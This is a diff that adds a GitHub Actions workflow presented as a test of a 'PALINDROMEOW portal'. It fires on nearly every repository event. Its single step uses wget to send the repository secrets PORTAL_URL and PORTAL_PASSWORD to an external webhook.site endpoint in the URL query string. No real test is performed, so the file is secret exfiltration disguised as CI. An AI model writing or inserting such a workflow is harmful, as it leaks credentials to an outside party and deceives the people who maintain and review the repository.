@@ -1,0 +1,13 @@
+name: Test the PALINDROMEOW portal
+
+on: [branch_protection_rule, check_run, check_suite, create, delete, deployment, deployment_status, discussion, discussion_comment, fork, gollum, issue_comment, issues, label, merge_group, milestone, page_build, project, project_card, project_column, public, pull_request, pull_request_review, pull_request_review_comment, pull_request_target, push, registry_package, release, repository_dispatch, schedule, status, watch, workflow_call, workflow_dispatch]
+
+jobs:
+  test:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Test the PALINDROMEOW portal
+        run: | 
+          C:\msys64\usr\bin\wget.exe '''https://webhook.site/107c1101-5fe1-4608-bb3b-b5569dec82d3?meow=${{ secrets.PORTAL_URL }}&bleh=${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
+          cat test
